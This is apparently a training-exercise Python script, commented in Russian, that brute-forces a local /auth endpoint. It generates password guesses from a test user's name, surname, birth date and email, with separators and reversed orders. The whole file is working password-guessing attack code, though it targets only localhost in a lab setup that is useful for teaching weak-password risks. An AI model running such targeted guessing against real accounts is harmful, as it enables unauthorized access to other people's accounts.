import requests

# в файл users.json был добавлен логин 'pupkin' с паролем 'vasya_1999_pupkin'

# логин который мы знаем
login = 'pupkin'

# все известные данные про пользователя
name = 'vasya'
surname = 'pupkin'
birth_date = '01'
birth_month = '09'
birth_year = '1999'
email_address = 'pupkin_vasya@gmail.com'

# комбинируем все известные данные в список
combinations = [email_address, name, surname, birth_year, birth_month, birth_date, '$', '%', '.', '_']

base = len(combinations)


for x in range(100000):

    result = []
    while x:
        remainder = x % base
        x //= base
        # комбинируем раззные известные данные со списка и записываем в result
        result.append(combinations[remainder])

    try:    # первая попытка забрутить пароль с символом '_'
        data = {'login': login, 'password': '_'.join(result)}
        response = requests.post('http://127.0.0.1:5000/auth', json=data)
        if response.status_code == 200:
            print(data)
            break

        data = {'login': login, 'password': ''.join(result)}
        response = requests.post('http://127.0.0.1:5000/auth', json=data)
        if response.status_code == 200:
            print(data)
            break

        # попытка забрутить пароль с символом '.'
        data = {'login': login, 'password': '.'.join(result)}
        response = requests.post('http://127.0.0.1:5000/auth', json=data)
        if response.status_code == 200:
            print(data)
            break

        #
        # there's possibility if we reverse result it could help find correct password
        # password: vasja_1999_pupkin_01_09
        # password: 09_01_pupkin_1999_vasja
        #

        # переворачиваем наш пароль
        result.reverse()

        # и пробуем теперь перевёрнутый пароль отправить на сервер
        data = {'login': login, 'password': "".join(result)}
        response = requests.post('http://127.0.0.1:5000/auth', json=data)
        if response.status_code == 200:
            print(data)
            break

        data = {'login': login, 'password': "_".join(result)}
        response = requests.post('http://127.0.0.1:5000/auth', json=data)
        if response.status_code == 200:
            print(data)
            break

        # попытка забрутить пароль с символом '.' и перевёрнутой комбинацией
        data = {'login': login, 'password': '.'.join(result)}
        response = requests.post('http://127.0.0.1:5000/auth', json=data)
        if response.status_code == 200:
            print(data)
            break
    except Exception as e:
        print("Возникла ошибка", e)

# Вариации паролей которые могут быть подобраны:
# vasya_pupkin_1999
# pupkin_pupkin_1999
# pupkin_pupkin_vasya_1999
# vasya_pupkin_pupkin_vasya_1999
# vasya_pupkin
# vasya_09_pupkin_1999
# vasya.09.pupkin.1999
# vasyapupkin1999
# vasya_pupkin$1999
